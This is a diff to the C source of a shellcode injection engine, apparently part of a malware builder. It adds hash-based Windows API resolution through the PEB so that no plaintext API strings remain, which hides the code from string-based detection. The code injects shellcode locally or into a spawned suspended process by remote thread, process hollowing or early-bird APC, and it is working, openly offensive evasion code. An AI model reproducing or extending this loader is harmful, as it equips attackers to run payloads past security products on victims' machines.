@@ -5,7 +5,7 @@
 #include <winternl.h>
 
 /*
- * Modular injection engine.
+ * Modular injection engine - hash-resolved, zero plaintext API strings.
  * Builder stamps one ALLOC_* define and one EXEC_* define.
  *
  * Allocation methods:
@@ -26,7 +26,42 @@
  *   INJECT_EARLYBIRD          - Create suspended process, QueueUserAPC, resume
  */
 
-/* ─── ntdll typedefs for direct syscall paths ─── */
+/* ─── FNV1a-32 function hashes ─── */
+
+#define H_NtAllocateVirtualMemory   0xca67b978u
+#define H_NtProtectVirtualMemory    0xbd799926u
+#define H_NtWriteVirtualMemory      0x43e32f32u
+#define H_NtCreateSection           0x3c59f362u
+#define H_NtMapViewOfSection        0xcbc9e1aeu
+#define H_NtQueueApcThread          0xb10f026cu
+#define H_TpAllocWork               0x678de62fu
+#define H_TpPostWork                0x0e031b86u
+#define H_TpReleaseWork             0xfaf7f1efu
+#define H_VirtualAllocEx            0xaeb6049cu
+#define H_VirtualProtectEx          0x00014c8eu
+#define H_WriteProcessMemory        0xc0088eeau
+#define H_CreateThread              0x60ac7e39u
+#define H_EnumWindows               0x6d15bbbdu
+#define H_ConvertThreadToFiber      0x97b1a935u
+#define H_CreateFiber               0x0a32b6b9u
+#define H_SwitchToFiber             0x8c6c4a42u
+#define H_DeleteFiber               0x25c5e3a4u
+#define H_Sleep                     0x2fa62ca8u
+#define H_WaitForSingleObject       0x71948ca4u
+#define H_CloseHandle               0xfaba0065u
+#define H_CreateProcessA            0x4a7c0a09u
+#define H_ResumeThread              0xbb21e02eu
+#define H_CreateRemoteThread        0xc398c463u
+#define H_TerminateProcess          0xf84eee59u
+#define H_GetThreadContext          0x85cca27eu
+#define H_SetThreadContext          0x6ed04712u
+#define H_QueueUserAPC              0x890bb4fbu
+
+#define H_MOD_NTDLL                 0xa62a3b3bu
+#define H_MOD_KERNEL32              0xa3e6f6c3u
+#define H_MOD_USER32                0xc0323159u
+
+/* ─── ntdll typedefs ─── */
 
 typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
     HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
@@ -52,10 +87,107 @@ typedef NTSTATUS (NTAPI *pTpAllocWork)(
 typedef void (NTAPI *pTpPostWork)(void*);
 typedef void (NTAPI *pTpReleaseWork)(void*);
 
-/* ─── resolve ntdll function ─── */
+typedef LPVOID  (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL    (WINAPI *pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
+typedef BOOL    (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+typedef HANDLE  (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef BOOL    (WINAPI *pEnumWindows)(WNDENUMPROC, LPARAM);
+typedef LPVOID  (WINAPI *pConvertThreadToFiber)(LPVOID);
+typedef LPVOID  (WINAPI *pCreateFiber)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
+typedef void    (WINAPI *pSwitchToFiber)(LPVOID);
+typedef void    (WINAPI *pDeleteFiber)(LPVOID);
+typedef void    (WINAPI *pSleep)(DWORD);
+typedef DWORD   (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
+typedef BOOL    (WINAPI *pCloseHandle)(HANDLE);
+typedef BOOL    (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+typedef DWORD   (WINAPI *pResumeThread)(HANDLE);
+typedef HANDLE  (WINAPI *pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef BOOL    (WINAPI *pTerminateProcess)(HANDLE, UINT);
+typedef BOOL    (WINAPI *pGetThreadContext)(HANDLE, LPCONTEXT);
+typedef BOOL    (WINAPI *pSetThreadContext)(HANDLE, const CONTEXT*);
+typedef DWORD   (WINAPI *pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
 
-static FARPROC engine_resolve(const char *name) {
-    return GetProcAddress(GetModuleHandleA("ntdll.dll"), name);
+/* ─── hash-based API resolution via PEB ─── */
+
+static unsigned int _fnv1a(const char *s) {
+    unsigned int h = 0x811c9dc5u;
+    while (*s) {
+        h ^= (unsigned char)*s++;
+        h *= 0x01000193u;
+    }
+    return h;
+}
+
+static unsigned int _fnv1a_ci(const WCHAR *s) {
+    unsigned int h = 0x811c9dc5u;
+    while (*s) {
+        unsigned char c = (unsigned char)*s;
+        if (c >= 'A' && c <= 'Z') c += 0x20;
+        h ^= c;
+        h *= 0x01000193u;
+        s++;
+    }
+    return h;
+}
+
+static void* _find_module(unsigned int mod_hash) {
+    char *peb;
+#ifdef _WIN64
+    peb = (char*)__readgsqword(0x60);
+#else
+    peb = (char*)__readfsdword(0x30);
+#endif
+    char *ldr  = *(char**)(peb + 0x18);
+    char *head = ldr + 0x20;
+    char *curr = *(char**)head;
+
+    while (curr != head) {
+        WCHAR *name = *(WCHAR**)(curr + 0x40);
+        if (name) {
+            WCHAR *base_name = name;
+            WCHAR *p = name;
+            while (*p) {
+                if (*p == '\\' || *p == '/') base_name = p + 1;
+                p++;
+            }
+            if (_fnv1a_ci(base_name) == mod_hash)
+                return *(void**)(curr + 0x20);
+        }
+        curr = *(char**)curr;
+    }
+    return NULL;
+}
+
+static FARPROC _resolve_export(void *mod_base, unsigned int func_hash) {
+    if (!mod_base) return NULL;
+    char *base = (char*)mod_base;
+    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
+    char *nt = base + e_lfanew;
+
+#ifdef _WIN64
+    DWORD export_rva  = *(DWORD*)(nt + 0x18 + 0x70);
+    DWORD export_size = *(DWORD*)(nt + 0x18 + 0x70 + 4);
+#else
+    DWORD export_rva  = *(DWORD*)(nt + 0x18 + 0x60);
+    DWORD export_size = *(DWORD*)(nt + 0x18 + 0x60 + 4);
+#endif
+    if (!export_rva || !export_size) return NULL;
+
+    char  *exports  = base + export_rva;
+    DWORD  num      = *(DWORD*)(exports + 0x18);
+    DWORD *names    = (DWORD*)(base + *(DWORD*)(exports + 0x20));
+    WORD  *ordinals = (WORD*) (base + *(DWORD*)(exports + 0x24));
+    DWORD *funcs    = (DWORD*)(base + *(DWORD*)(exports + 0x1C));
+
+    for (DWORD i = 0; i < num; i++) {
+        if (_fnv1a(base + names[i]) == func_hash)
+            return (FARPROC)(base + funcs[ordinals[i]]);
+    }
+    return NULL;
+}
+
+static FARPROC _resolve(unsigned int mod_hash, unsigned int func_hash) {
+    return _resolve_export(_find_module(mod_hash), func_hash);
 }
 
 /* ═══════════════════════════════════════════════════════
@@ -65,7 +197,7 @@ static FARPROC engine_resolve(const char *name) {
 static void* engine_alloc(HANDLE hProcess, SIZE_T size) {
 #if defined(ALLOC_NTALLOCATE)
     pNtAllocateVirtualMemory NtAlloc =
-        (pNtAllocateVirtualMemory)engine_resolve("NtAllocateVirtualMemory");
+        (pNtAllocateVirtualMemory)_resolve(H_MOD_NTDLL, H_NtAllocateVirtualMemory);
     void *addr = NULL;
     SIZE_T region = size;
     NTSTATUS st = NtAlloc(hProcess, &addr, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -73,63 +205,60 @@ static void* engine_alloc(HANDLE hProcess, SIZE_T size) {
 
 #elif defined(ALLOC_MAPVIEW)
     pNtCreateSection NtCreate =
-        (pNtCreateSection)engine_resolve("NtCreateSection");
+        (pNtCreateSection)_resolve(H_MOD_NTDLL, H_NtCreateSection);
     pNtMapViewOfSection NtMap =
-        (pNtMapViewOfSection)engine_resolve("NtMapViewOfSection");
+        (pNtMapViewOfSection)_resolve(H_MOD_NTDLL, H_NtMapViewOfSection);
 
     HANDLE hSection = NULL;
     LARGE_INTEGER secSize;
     secSize.QuadPart = (LONGLONG)size;
 
     NTSTATUS st = NtCreate(&hSection, SECTION_ALL_ACCESS, NULL, &secSize,
-                           PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+                           PAGE_READWRITE, SEC_COMMIT, NULL);
     if (st != 0) return NULL;
 
     void *addr = NULL;
     SIZE_T viewSize = 0;
-    st = NtMap(hSection, hProcess, &addr, 0, 0, NULL, &viewSize, 1 /* ViewShare */, 0, PAGE_EXECUTE_READWRITE);
-    CloseHandle(hSection);
+    st = NtMap(hSection, hProcess, &addr, 0, 0, NULL, &viewSize, 1, 0, PAGE_READWRITE);
+    pCloseHandle pClose = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
+    if (pClose) pClose(hSection);
     return (st == 0) ? addr : NULL;
 
 #else /* ALLOC_VIRTUALALLOC (default) */
-    return VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    pVirtualAllocEx pAlloc = (pVirtualAllocEx)_resolve(H_MOD_KERNEL32, H_VirtualAllocEx);
+    return pAlloc ? pAlloc(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) : NULL;
 #endif
 }
 
 static int engine_protect(HANDLE hProcess, void *addr, SIZE_T size) {
-#if defined(ALLOC_NTALLOCATE)
+#if defined(ALLOC_NTALLOCATE) || defined(ALLOC_MAPVIEW)
     pNtProtectVirtualMemory NtProtect =
-        (pNtProtectVirtualMemory)engine_resolve("NtProtectVirtualMemory");
-    ULONG old = 0;
-    void *base = addr;
-    SIZE_T region = size;
-    return NtProtect(hProcess, &base, &region, PAGE_EXECUTE_READ, &old) == 0;
-
-#elif defined(ALLOC_MAPVIEW)
-    /* mapped sections created with PAGE_EXECUTE_READWRITE can be re-protected */
-    pNtProtectVirtualMemory NtProtect =
-        (pNtProtectVirtualMemory)engine_resolve("NtProtectVirtualMemory");
+        (pNtProtectVirtualMemory)_resolve(H_MOD_NTDLL, H_NtProtectVirtualMemory);
     ULONG old = 0;
     void *base = addr;
     SIZE_T region = size;
     return NtProtect(hProcess, &base, &region, PAGE_EXECUTE_READ, &old) == 0;
 
 #else
+    pVirtualProtectEx pProtect = (pVirtualProtectEx)_resolve(H_MOD_KERNEL32, H_VirtualProtectEx);
     DWORD old;
-    return VirtualProtectEx(hProcess, addr, size, PAGE_EXECUTE_READ, &old);
+    return pProtect ? pProtect(hProcess, addr, size, PAGE_EXECUTE_READ, &old) : 0;
 #endif
 }
 
 static void engine_write(HANDLE hProcess, void *dst, const void *src, SIZE_T size) {
-    if (hProcess == GetCurrentProcess()) {
-        memcpy(dst, src, size);
+    if (hProcess == (HANDLE)-1) {
+        char *d = (char*)dst;
+        const char *s = (const char*)src;
+        for (SIZE_T i = 0; i < size; i++) d[i] = s[i];
     } else {
         pNtWriteVirtualMemory NtWrite =
-            (pNtWriteVirtualMemory)engine_resolve("NtWriteVirtualMemory");
+            (pNtWriteVirtualMemory)_resolve(H_MOD_NTDLL, H_NtWriteVirtualMemory);
         if (NtWrite) {
             NtWrite(hProcess, dst, (PVOID)src, size, NULL);
         } else {
-            WriteProcessMemory(hProcess, dst, src, size, NULL);
+            pWriteProcessMemory pWrite = (pWriteProcessMemory)_resolve(H_MOD_KERNEL32, H_WriteProcessMemory);
+            if (pWrite) pWrite(hProcess, dst, src, size, NULL);
         }
     }
 }
@@ -143,32 +272,41 @@ struct FiberCtx { void *sc_addr; void *main_fiber; };
 static void CALLBACK engine_fiber_wrapper(LPVOID param) {
     struct FiberCtx *ctx = (struct FiberCtx*)param;
     ((void(*)())ctx->sc_addr)();
-    SwitchToFiber(ctx->main_fiber);
+    pSwitchToFiber pSwitch = (pSwitchToFiber)_resolve(H_MOD_KERNEL32, H_SwitchToFiber);
+    if (pSwitch) pSwitch(ctx->main_fiber);
 }
 #endif
 
 static HANDLE engine_exec_local(void *addr) {
 #if defined(EXEC_CREATETHREAD)
-    return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
+    pCreateThread pCT = (pCreateThread)_resolve(H_MOD_KERNEL32, H_CreateThread);
+    return pCT ? pCT(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL) : NULL;
 
 #elif defined(EXEC_CALLBACK)
-    EnumWindows((WNDENUMPROC)addr, 0);
+    pEnumWindows pEW = (pEnumWindows)_resolve(H_MOD_USER32, H_EnumWindows);
+    if (pEW) pEW((WNDENUMPROC)addr, 0);
     return NULL;
 
 #elif defined(EXEC_FIBER)
-    void *mainFiber = ConvertThreadToFiber(NULL);
+    pConvertThreadToFiber pConvert = (pConvertThreadToFiber)_resolve(H_MOD_KERNEL32, H_ConvertThreadToFiber);
+    pCreateFiber pCreate = (pCreateFiber)_resolve(H_MOD_KERNEL32, H_CreateFiber);
+    pSwitchToFiber pSwitch = (pSwitchToFiber)_resolve(H_MOD_KERNEL32, H_SwitchToFiber);
+    pDeleteFiber pDelete = (pDeleteFiber)_resolve(H_MOD_KERNEL32, H_DeleteFiber);
+    if (!pConvert || !pCreate || !pSwitch || !pDelete) return NULL;
+
+    void *mainFiber = pConvert(NULL);
     if (!mainFiber) return NULL;
     struct FiberCtx ctx = { addr, mainFiber };
-    void *scFiber = CreateFiber(0, engine_fiber_wrapper, &ctx);
+    void *scFiber = pCreate(0, engine_fiber_wrapper, &ctx);
     if (!scFiber) return NULL;
-    SwitchToFiber(scFiber);
-    DeleteFiber(scFiber);
+    pSwitch(scFiber);
+    pDelete(scFiber);
     return NULL;
 
 #elif defined(EXEC_THREADPOOL)
-    pTpAllocWork TpAlloc = (pTpAllocWork)engine_resolve("TpAllocWork");
-    pTpPostWork  TpPost  = (pTpPostWork)engine_resolve("TpPostWork");
-    pTpReleaseWork TpRel = (pTpReleaseWork)engine_resolve("TpReleaseWork");
+    pTpAllocWork TpAlloc = (pTpAllocWork)_resolve(H_MOD_NTDLL, H_TpAllocWork);
+    pTpPostWork  TpPost  = (pTpPostWork)_resolve(H_MOD_NTDLL, H_TpPostWork);
+    pTpReleaseWork TpRel = (pTpReleaseWork)_resolve(H_MOD_NTDLL, H_TpReleaseWork);
 
     if (!TpAlloc || !TpPost || !TpRel) return NULL;
 
@@ -177,8 +315,8 @@ static HANDLE engine_exec_local(void *addr) {
     if (st != 0 || !work) return NULL;
     TpPost(work);
     TpRel(work);
-    /* sleep briefly to let threadpool execute */
-    Sleep(1000);
+    pSleep pSl = (pSleep)_resolve(H_MOD_KERNEL32, H_Sleep);
+    if (pSl) pSl(1000);
     return NULL;
 
 #else /* EXEC_DIRECT (default) */
@@ -193,116 +331,135 @@ static HANDLE engine_exec_local(void *addr) {
 
 #if defined(INJECT_REMOTE)
 static int engine_inject_remote(const unsigned char *sc, unsigned int sc_len, const char *target) {
+    pCreateProcessA pCP = (pCreateProcessA)_resolve(H_MOD_KERNEL32, H_CreateProcessA);
+    pTerminateProcess pTP = (pTerminateProcess)_resolve(H_MOD_KERNEL32, H_TerminateProcess);
+    pCloseHandle pCH = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
+    pResumeThread pRT = (pResumeThread)_resolve(H_MOD_KERNEL32, H_ResumeThread);
+    pCreateRemoteThread pCRT = (pCreateRemoteThread)_resolve(H_MOD_KERNEL32, H_CreateRemoteThread);
+    pWaitForSingleObject pWFSO = (pWaitForSingleObject)_resolve(H_MOD_KERNEL32, H_WaitForSingleObject);
+    if (!pCP || !pCH) return 0;
+
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
 
-    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
-                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+    if (!pCP(target, NULL, NULL, NULL, FALSE,
+             CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
         return 0;
     }
 
     void *addr = engine_alloc(pi.hProcess, sc_len);
     if (!addr) {
-        TerminateProcess(pi.hProcess, 1);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
+        if (pTP) pTP(pi.hProcess, 1);
+        pCH(pi.hThread);
+        pCH(pi.hProcess);
         return 0;
     }
 
     engine_write(pi.hProcess, addr, sc, sc_len);
     engine_protect(pi.hProcess, addr, sc_len);
 
-    ResumeThread(pi.hThread);
+    if (pRT) pRT(pi.hThread);
 
-    HANDLE hRemote = CreateRemoteThread(pi.hProcess, NULL, 0,
-                                        (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
+    HANDLE hRemote = pCRT ? pCRT(pi.hProcess, NULL, 0,
+                                  (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL) : NULL;
     if (hRemote) {
-        WaitForSingleObject(hRemote, INFINITE);
-        CloseHandle(hRemote);
+        if (pWFSO) pWFSO(hRemote, INFINITE);
+        pCH(hRemote);
     }
 
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    pCH(pi.hThread);
+    pCH(pi.hProcess);
     return 1;
 }
 #endif
 
 #if defined(INJECT_HOLLOW)
 static int engine_inject_hollow(const unsigned char *sc, unsigned int sc_len, const char *target) {
+    pCreateProcessA pCP = (pCreateProcessA)_resolve(H_MOD_KERNEL32, H_CreateProcessA);
+    pTerminateProcess pTP = (pTerminateProcess)_resolve(H_MOD_KERNEL32, H_TerminateProcess);
+    pCloseHandle pCH = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
+    pGetThreadContext pGTC = (pGetThreadContext)_resolve(H_MOD_KERNEL32, H_GetThreadContext);
+    pSetThreadContext pSTC = (pSetThreadContext)_resolve(H_MOD_KERNEL32, H_SetThreadContext);
+    pResumeThread pRT = (pResumeThread)_resolve(H_MOD_KERNEL32, H_ResumeThread);
+    if (!pCP || !pCH || !pGTC || !pSTC || !pRT) return 0;
+
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
 
-    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
-                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+    if (!pCP(target, NULL, NULL, NULL, FALSE,
+             CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
         return 0;
     }
 
-    /* get thread context to find entry point */
     CONTEXT ctx;
     ctx.ContextFlags = CONTEXT_FULL;
-    GetThreadContext(pi.hThread, &ctx);
+    pGTC(pi.hThread, &ctx);
 
-    /* allocate in remote process at any address */
     void *addr = engine_alloc(pi.hProcess, sc_len);
     if (!addr) {
-        TerminateProcess(pi.hProcess, 1);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
+        if (pTP) pTP(pi.hProcess, 1);
+        pCH(pi.hThread);
+        pCH(pi.hProcess);
         return 0;
     }
 
     engine_write(pi.hProcess, addr, sc, sc_len);
     engine_protect(pi.hProcess, addr, sc_len);
 
-    /* redirect RIP/EIP to shellcode */
 #ifdef _WIN64
     ctx.Rip = (DWORD64)addr;
 #else
     ctx.Eip = (DWORD)addr;
 #endif
-    SetThreadContext(pi.hThread, &ctx);
-    ResumeThread(pi.hThread);
+    pSTC(pi.hThread, &ctx);
+    pRT(pi.hThread);
 
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    pCH(pi.hThread);
+    pCH(pi.hProcess);
     return 1;
 }
 #endif
 
 #if defined(INJECT_EARLYBIRD)
 static int engine_inject_earlybird(const unsigned char *sc, unsigned int sc_len, const char *target) {
+    pCreateProcessA pCP = (pCreateProcessA)_resolve(H_MOD_KERNEL32, H_CreateProcessA);
+    pTerminateProcess pTP = (pTerminateProcess)_resolve(H_MOD_KERNEL32, H_TerminateProcess);
+    pCloseHandle pCH = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
+    pResumeThread pRT = (pResumeThread)_resolve(H_MOD_KERNEL32, H_ResumeThread);
+    if (!pCP || !pCH || !pRT) return 0;
+
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
 
-    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
-                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+    if (!pCP(target, NULL, NULL, NULL, FALSE,
+             CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
         return 0;
     }
 
     void *addr = engine_alloc(pi.hProcess, sc_len);
     if (!addr) {
-        TerminateProcess(pi.hProcess, 1);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
+        if (pTP) pTP(pi.hProcess, 1);
+        pCH(pi.hThread);
+        pCH(pi.hProcess);
         return 0;
     }
 
     engine_write(pi.hProcess, addr, sc, sc_len);
     engine_protect(pi.hProcess, addr, sc_len);
 
-    /* queue APC to main thread - executes before entry point */
     pNtQueueApcThread NtQueueApc =
-        (pNtQueueApcThread)engine_resolve("NtQueueApcThread");
+        (pNtQueueApcThread)_resolve(H_MOD_NTDLL, H_NtQueueApcThread);
     if (NtQueueApc) {
         NtQueueApc(pi.hThread, addr, NULL, NULL, NULL);
     } else {
-        QueueUserAPC((PAPCFUNC)addr, pi.hThread, 0);
+        pQueueUserAPC pQUA = (pQueueUserAPC)_resolve(H_MOD_KERNEL32, H_QueueUserAPC);
+        if (pQUA) pQUA((PAPCFUNC)addr, pi.hThread, 0);
     }
 
-    ResumeThread(pi.hThread);
+    pRT(pi.hThread);
 
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    pCH(pi.hThread);
+    pCH(pi.hProcess);
     return 1;
 }
 #endif
@@ -319,8 +476,7 @@ static int engine_run(const unsigned char *sc, unsigned int sc_len) {
 #elif defined(INJECT_EARLYBIRD)
     return engine_inject_earlybird(sc, sc_len, %INJECT_TARGET%);
 #else
-    /* local execution */
-    HANDLE hSelf = GetCurrentProcess();
+    HANDLE hSelf = (HANDLE)-1;
     void *addr = engine_alloc(hSelf, sc_len);
     if (!addr) return 0;
 
@@ -329,8 +485,10 @@ static int engine_run(const unsigned char *sc, unsigned int sc_len) {
 
     HANDLE hThread = engine_exec_local(addr);
     if (hThread) {
-        WaitForSingleObject(hThread, INFINITE);
-        CloseHandle(hThread);
+        pWaitForSingleObject pWFSO = (pWaitForSingleObject)_resolve(H_MOD_KERNEL32, H_WaitForSingleObject);
+        pCloseHandle pCH = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
+        if (pWFSO) pWFSO(hThread, INFINITE);
+        if (pCH) pCH(hThread);
     }
     return 1;
 #endif
